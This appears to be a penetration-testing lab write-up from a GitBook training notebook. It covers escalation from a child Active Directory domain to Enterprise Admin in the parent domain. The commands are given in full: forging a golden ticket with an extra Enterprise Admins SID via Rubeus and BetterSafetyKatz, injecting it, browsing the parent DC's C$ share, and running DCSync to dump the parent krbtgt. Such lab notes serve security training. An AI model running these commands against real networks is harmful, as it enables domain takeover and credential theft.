# 🦭 Escalate privileges to Enterprise Admin or DA to the parent domain,  using krbtgt hash

We already have the krbtgt hash from dcorp-dc. Let's create the inter-realm TGT and inject.

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
```

<figure><img src="../../.gitbook/assets/image (1146).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

We can now access mcorp-dc!

<figure><img src="../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

Now let's try using BetterSafetyKatz ->

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /ptt" "exit"
```

And now we can check if we can use this  file/ ticket

```
dir \\mcorp-dc.moneycorp.local\c$
```

<figure><img src="../../.gitbook/assets/image (1149).png" alt=""><figcaption></figcaption></figure>

And now we could run DCSync agains mcorp-dc to extract secrets from it, start by encoding "lsadump::dcsync"

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

<figure><img src="../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>
